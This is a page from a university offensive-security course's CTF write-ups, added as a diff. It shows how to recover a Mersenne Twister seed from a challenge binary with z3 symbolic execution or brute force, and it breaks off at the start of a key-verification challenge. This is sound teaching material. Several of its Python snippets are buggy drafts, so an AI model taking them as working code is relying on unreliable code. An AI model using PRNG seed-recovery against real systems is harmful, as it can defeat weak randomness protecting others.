@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.725804997873">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 2.4.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Symbolic</title>
+    <meta name="title" content="Symbolic">
+    <meta name="description" content="Very simple program in theory: it takes 4 truly random bytes from /dev/random, it checks them agains user input: if they are equal, it prints the..." />
+
+    <!-- Canonical -->
+    <link rel="canonical" href="/05-symbolic/" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="/05-symbolic/">
+    <meta property="og:title" content="Symbolic">
+    <meta property="og:description" content="Very simple program in theory: it takes 4 truly random bytes from /dev/random, it checks them agains user input: if they are equal, it prints the...">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="/05-symbolic/">
+    <meta property="twitter:title" content="Symbolic">
+    <meta property="twitter:description" content="Very simple program in theory: it takes 4 truly random bytes from /dev/random, it checks them agains user input: if they are equal, it prints the...">
+
+    <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../resources/css/retype.css?v=2.4.0.725804997873" rel="stylesheet" />
+
+    <script type="text/javascript" src="../resources/js/config.js?v=2.4.0.725804997873" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../resources/js/lunr.js?v=2.4.0.725804997873" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../resources/js/prism.js?v=2.4.0.725804997873" defer></script>
+    <link href="../resources/css/katex.css?v=2.4.0" rel="stylesheet" />
+    <script id="katex-js" type="text/javascript" src="../resources/js/katex.js?v=2.4.0" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../" class="flex items-center leading-snug text-xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Offensive and Defensive Cybersecurity [2021/2022] [056896]</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Challenges summary &amp; write-up</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+        
+                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
+                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
+                        </div>
+        
+                        <!-- Mobile search button mock -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placehokder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button mock -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
+                </div>
+            
+                <div class="pl-6 mb-4 mt-1">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="grow min-w-0 px-6 md:px-16">
+                        <main class="relative pt-6 pb-16">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="symbolic" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#symbolic">#</doc-anchor-trigger>
+        <span>Symbolic</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="pnrg">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#pnrg">#</doc-anchor-trigger>
+        <span>pnrg</span>
+    </h2>
+</doc-anchor-target>
+<p>Very simple program in theory: it takes 4 truly random bytes from <code v-pre>/dev/random</code>, it checks them agains user input: if they are equal, it prints the flag. Basically we need to recover those random bytes. In the middle of this we have some calls to functions called <code v-pre>seedRand</code> and <code v-pre>genRandLong</code>, which together with the name of the challenge can give us some hints about its nature:</p>
+<blockquote>
+<p>Most <a href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">pseudo-random number generators (PRNGs)</a> are build on algorithms involving some kind of recursive method starting from a base value that is determined by an input called the &quot;seed&quot;.</p>
+<p>...</p>
+<p>The purpose of the seed is to allow the user to &quot;lock&quot; the pseudo-random number generator, to allow replicable analysis. Some analysts like to set the seed using a <a href="https://en.wikipedia.org/wiki/Hardware_random_number_generator">true random-number generator (TRNG)</a> which uses hardware inputs to generate an initial seed number, and then report this as a locked number. If the seed is set and reported by the original user then an auditor can repeat the analysis and obtain the same sequence of pseudo-random numbers as the original user. If the seed is not set then the algorithm will usually use some kind of default seed (e.g., from the system clock), and it will generally not be possible to replicate the randomisation.</p>
+</blockquote>
+<p>There are various ways to solve the challenge, from symbolic analysis (the most sophisticated), to brute forcing (the simplest method).</p>
+<p>From the Ghidra pseudocode we can deduce that <code v-pre>local_1408</code> is the internal state of the algorithm. It is a structure that holds all of its internal data.</p>
+<p><strong>Note</strong>: the seed is 8 bytes long.</p>
+<doc-anchor-target id="symbolic-execution-method">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#symbolic-execution-method">#</doc-anchor-trigger>
+        <span>Symbolic execution method</span>
+    </h3>
+</doc-anchor-target>
+<p>Basically we need to replicate the behaviour of the program using z3 to reconstruct the final output. <code v-pre>main</code> code:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">  ...
+  dev_rand = open(&quot;/dev/random&quot;,0);
+  read(dev_rand,&amp;local_1418,4);
+  close(dev_rand);
+  seedRand(internalState,(long)(int)local_1418);
+  for (local_1414 = 0; local_1414 &lt; 1000; local_1414 = local_1414 + 1) {
+    genRandLong(internalState);
+  }
+  uVar1 = genRandLong(internalState);
+  printf(&quot;%#lx, &quot;,uVar1);
+  ...</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">import z3
+
+def seedRand(i):
+    return i
+
+def genRandLong():
+    return 0
+
+seed = z3.BitVec('seed', 32)
+
+seedRand(seed)
+for _ in range(1000):
+    genRandLong()
+
+output = genRandLong()
+
+z3.solver(output == 0xaabbccdd)</code></pre>
+</doc-codeblock></div>
+<p>What&#x27;s the hard part here? We need to replicate the gen and seed function as they are in the binary.</p>
+<p><strong>Where to start?</strong> Let&#x27;s look at <code v-pre>genRandLong</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">ulong genRandLong(undefined8 *param_1)
+
+{
+  int iVar1;
+  ulong uVar2;
+  int local_14;
+
+  if ((0x26f &lt; *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) &lt; 0)) {
+    if ((0x270 &lt; *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) &lt; 0)) {
+      m_seedRand(param_1,0x1105);
+    }
+    for (local_14 = 0; local_14 &lt; 0xe3; local_14 = local_14 + 1) {
+      param_1[local_14] =
+           param_1[local_14 + 0x18d] ^
+           (ulong)(((uint)param_1[local_14 + 1] &amp; 0x7fffffff | (uint)param_1[local_14] &amp; 0x80000000)
+                  &gt;&gt; 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] &amp; 1) * 8);
+    }
+    for (; local_14 &lt; 0x26f; local_14 = local_14 + 1) {
+      param_1[local_14] =
+           param_1[local_14 + -0xe3] ^
+           (ulong)(((uint)param_1[local_14 + 1] &amp; 0x7fffffff | (uint)param_1[local_14] &amp; 0x80000000)
+                  &gt;&gt; 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] &amp; 1) * 8);
+    }
+    param_1[0x26f] =
+         param_1[0x18c] ^
+         (ulong)(((uint)*param_1 &amp; 0x7fffffff | (uint)param_1[0x26f] &amp; 0x80000000) &gt;&gt; 1) ^
+         *(ulong *)(mag.3808 + (ulong)((uint)*param_1 &amp; 1) * 8);
+    *(undefined4 *)(param_1 + 0x270) = 0;
+  }
+  iVar1 = *(int *)(param_1 + 0x270);
+  *(int *)(param_1 + 0x270) = iVar1 + 1;
+  uVar2 = param_1[iVar1] ^ (ulong)param_1[iVar1] &gt;&gt; 0xb;
+  uVar2 = uVar2 ^ (uint)(uVar2 &lt;&lt; 7) &amp; 0x9d2c5680;
+  uVar2 = uVar2 ^ (uint)(uVar2 &lt;&lt; 0xf) &amp; 0xefc60000;
+  return uVar2 ^ uVar2 &gt;&gt; 0x12;
+}</code></pre>
+</doc-codeblock></div>
+<p>Ok, it looks a bit scary... A quick google search of the constants brings up the algorithm that is being implemented here: Marsenne Twister 19937 generator.</p>
+<blockquote>
+<p>A pseudo-random number generator engine that produces unsigned integer numbers in the closed interval <span class="math">[0,2^{w}-1]</span>.</p>
+<p>The algorithm used by this engine is optimized to compute large series of numbers (such as in Monte Carlo experiments) with an almost uniform distribution in the range.</p>
+<p>The engine has an internal state sequence of <em>n</em> integer elements, which is filled with a pseudo-random series generated on <a href="https://www.cplusplus.com/mersenne_twister_engine::mersenne_twister_engine">construction</a> or by calling member function <a href="https://www.cplusplus.com/mersenne_twister_engine::seed">seed</a>.</p>
+<p>The internal state sequence becomes the source for <em>n</em> elements: When the state is advanced (for example, in order to produce a new random number), the engine alters the state sequence by <em>twisting</em> the current value using xor mask <em>a</em> on a mix of bits determined by parameter <em>r</em> that come from that value and from a value <em>m</em> elements away (see <a href="https://www.cplusplus.com/mersenne_twister_engine::operator()">operator()</a> for details).</p>
+<p>The random numbers produced are tempered versions of these twisted values. The tempering is a sequence of shift and xor operations defined by parameters <em>u</em>, <em>d</em>, <em>s</em>, <em>b</em>, <em>t</em>, <em>c</em> and <em>l</em> applied on the selected state value (see <a href="https://www.cplusplus.com/mersenne_twister_engine::operator()">operator()</a>).</p>
+<p>The random numbers generated by <code v-pre>mersenne_twister_engine</code> have a period equivalent to the <em>mersenne number</em> <span class="math">2^{(n-1)w}-1</span>.</p>
+</blockquote>
+<p><strong>Note about IPython</strong></p>
+<p>If we want to execute some code in python and then manipulate its output manually or to play with it, we can append this at the end of the script:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">from IPython import embed
+embed()</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="seedrand">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#seedrand">#</doc-anchor-trigger>
+        <span><code v-pre>seedRand</code></span>
+    </h4>
+</doc-anchor-target>
+<p>Let&#x27;s start by converting <code v-pre>m_seedRand</code> in python:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">void m_seedRand(ulong *state,ulong seed)
+
+{
+  *state = seed &amp; 0xffffffff;
+  *(undefined4 *)(state + 0x270) = 1;
+  while (*(int *)(state + 0x270) &lt; 0x270) {
+    state[*(int *)(state + 0x270)] =
+         (ulong)(uint)((int)state[*(int *)(state + 0x270) + -1] * 0x17b5);
+    *(int *)(state + 0x270) = *(int *)(state + 0x270) + 1;
+  }
+  return;
+}</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def seedRand(state, seed):
+    state = seed &amp; 0xffffffff;
+    state[0x271] = 1
+    while state[0x270] &lt; 0x270:
+        state[state[0x271]] = state[state[0x271]-1] * 0x17b5
+        state[0x271] = state[0x271] + 1
+    return state</code></pre>
+</doc-codeblock></div>
+<p>Now, since state is an important structure in the original algorithm, it is better to initialize it as a class in our exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">class State:
+    def __init__(self):
+        self.state = [0]*270
+        self.index = 0</code></pre>
+</doc-codeblock></div>
+<p>Which means we can simplify the previous implementation:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def seedRand(s, seed):
+    s.state[0] = seed &amp; 0xffffffff;
+    s.index = 1;
+    while s.index &lt; 0x270:
+        s.state[s.index] = s.state[s.index - 1] * 0x17b5
+        s.index = s.index + 1
+    return s</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="genrandlong">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#genrandlong">#</doc-anchor-trigger>
+        <span><code v-pre>genRandLong</code></span>
+    </h4>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">ulong genRandLong(undefined8 *param_1)
+
+{
+  int iVar1;
+  ulong uVar2;
+  int local_14;
+
+  if ((0x26f &lt; *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) &lt; 0)) {
+    if ((0x270 &lt; *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) &lt; 0)) {
+      m_seedRand(param_1,0x1105);
+    }
+    for (local_14 = 0; local_14 &lt; 0xe3; local_14 = local_14 + 1) {
+      param_1[local_14] =
+           param_1[local_14 + 0x18d] ^
+           (ulong)(((uint)param_1[local_14 + 1] &amp; 0x7fffffff | (uint)param_1[local_14] &amp; 0x80000000)
+                  &gt;&gt; 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] &amp; 1) * 8);
+    }
+    for (; local_14 &lt; 0x26f; local_14 = local_14 + 1) {
+      param_1[local_14] =
+           param_1[local_14 + -0xe3] ^
+           (ulong)(((uint)param_1[local_14 + 1] &amp; 0x7fffffff | (uint)param_1[local_14] &amp; 0x80000000)
+                  &gt;&gt; 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] &amp; 1) * 8);
+    }
+    param_1[0x26f] =
+         param_1[0x18c] ^
+         (ulong)(((uint)*param_1 &amp; 0x7fffffff | (uint)param_1[0x26f] &amp; 0x80000000) &gt;&gt; 1) ^
+         *(ulong *)(mag.3808 + (ulong)((uint)*param_1 &amp; 1) * 8);
+    *(undefined4 *)(param_1 + 0x270) = 0;
+  }
+  iVar1 = *(int *)(param_1 + 0x270);
+  *(int *)(param_1 + 0x270) = iVar1 + 1;
+  uVar2 = param_1[iVar1] ^ (ulong)param_1[iVar1] &gt;&gt; 0xb;
+  uVar2 = uVar2 ^ (uint)(uVar2 &lt;&lt; 7) &amp; 0x9d2c5680;
+  uVar2 = uVar2 ^ (uint)(uVar2 &lt;&lt; 0xf) &amp; 0xefc60000;
+  return uVar2 ^ uVar2 &gt;&gt; 0x12;
+}</code></pre>
+</doc-codeblock></div>
+<p>Wtf is <code v-pre>mag.3808</code>? It a global variable 16 bytes big. The first 8 are null, while the remaining 8 are a hexadecimal value. Note also that its index is <code v-pre>&amp; 1</code>, which means that it is either 0 or 1 (ampersand of arity two is the bitwise AND operator). This translates in python as:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">MAG = [0x0, 0x9908b0df]
+def mag(i):
+    return z3.If(i == 0, 0x0, 0x9908b0df)</code></pre>
+</doc-codeblock></div>
+<p>Actually this does not work:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">raise Z3Exception(msg)
+z3.z3types.Z3Exception: sort mismatch</code></pre>
+</doc-codeblock></div>
+<p>Because it is a python integer and z3 does not know how to work with it. Solution: create a <code v-pre>BitVecVal</code>.</p>
+<p>Python translation of the function :</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">def genRandLong(s):
+    if ((0x26f &lt; s.index) or (s.index &lt; 0)):
+        if ((0x270 &lt; s.index) or (s.index &lt; 0)):
+            seedRand(s,0x1105) 
+    for local_14 in range(0xe3):
+        p1 = s.state[local_14 + 0x18d]
+        p2 = (s.state[local_14 + 1] &amp; 0x7fffffff | s.state[local_14] &amp; 0x80000000) &gt;&gt; 1
+        p3 = mag((s.state[local_14 + 1] &amp; 1))
+        s.state[local_14] = p1 ^ p2 ^ p3
+
+    for local_14 in range(0xe3, 0x26f): 
+        p1 = s.state[local_14 - 0xe3]
+        p2 = s.state[local_14 + 1] &amp; 0x7fffffff | s.state[local_14] &amp; 0x80000000 &gt;&gt; 1
+        p3 = mag((s.state[local_14 + 1] &amp; 1))
+        s.state[local_14] = p1 ^ p2 ^ p3
+
+    p1 = s.state[0x18c]
+    p2 = (s.state[0] &amp; 0x7fffffff | s.state[0x26f] &amp; 0x80000000) &gt;&gt; 1
+    p3 = mag((s.state[0] &amp; 1))
+    s.state[0x26f] = p1 ^ p2 ^ p3
+    s.index = 0
+    iVar1 = s.index
+    s.index = iVar1 + 1
+    uVar2 = s.state[iVar1] ^ s.state[iVar1] &gt;&gt; 0xb
+    uVar2 = uVar2 ^ (uVar2 &lt;&lt; 7) &amp; 0x9d2c5680
+    uVar2 = uVar2 ^ (uVar2 &lt;&lt; 0xf) &amp; 0xefc60000
+    rand_num = uVar2 ^ uVar2 &gt;&gt; 0x12
+    return s, rand_num</code></pre>
+</doc-codeblock></div>
+<p>Note that we need to fix variable length: if we multiply two 32 bit numbers, the output would be 64 bits long. We need to add an ampersand <code v-pre>0xffffffff</code> after the multiplication.</p>
+<p><strong>Bruteforce approach</strong></p>
+<p>Recall: this code is a random number generator with a random seed. The challenge prints out the 1001 random number and it asks for the random seed. Up until now we saw constraint programming (<strong>symbolic execution</strong>). We can also bruteforce it <strong>locally</strong>. It can be done two ways: by restarting every time the challenge binary, which can be costly, or by reimplementing the algorithm in another binary and launching this modified binary only one time.</p>
+<p><strong>Note</strong>: code without syscalls is faster.</p>
+<p>Why are we able to reverse: from the same state we can always get the same output. <strong>The only random part of the algorithm is the seed</strong>.</p>
+<doc-anchor-target id="prodkey">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#prodkey">#</doc-anchor-trigger>
+        <span>prodkey</span>
+    </h2>
+</doc-anchor-target>
+<p>We have a 30 characters long key that we have to guess to get the flag, which is stored remotely. To check the correctness of our input flag the binary calls a function called <code v-pre>verify_key</code>, which returns 1 if its correct, 0 otherwise.</p>
+<p>More specifically this is the check implemented by <code v-pre>verify_key</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">cVar1 = check_01(key);
+if (((((cVar1 == '\0') || (cVar1 = check_02(key), cVar1 == '\0')) ||
+         (cVar1 = check_03(key), cVar1 == '\0')) ||
+        (((cVar1 = check_04(key), cVar1 == '\0' || (cVar1 = check_05(key), cVar1 == '\0')) ||
+         ((cVar1 = check_06(key), cVar1 == '\0' ||
+          ((cVar1 = check_07(key), cVar1 == '\0' || (cVar1 = check_08(key), cVar1 == '\0')))))))) ||
+       ((cVar1 = check_09(key), cVar1 == '\0' ||
+        (((((cVar1 = check_0A(key), cVar1 == '\0' || (cVar1 = check_0B(key), cVar1 == '\0')) ||
+           (cVar1 = check_0C(key), cVar1 == '\0')) ||
+          ((cVar1 = check_0D(key), cVar1 == '\0' || (cVar1 = check_0E(key), cVar1 == '\0')))) ||
+          (cVar1 = check_0F(key), cVar1 == '\0')))))) {
+auth = 0;</code></pre>
+</doc-codeblock></div>
+<p>As we can see we have a bunch of functions that have to <strong>not</strong> return zero in order fot the check to pass. We need z3 to reverse them. They are 16 (one for each hexadecimal cypher). Or we can use angr. Using z3 can be quite time consuming, since we have to rework all the checks functions to be compatible with z3&#x27;s symbolic data types. Foe example <code v-pre>check_01</code> would go from:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
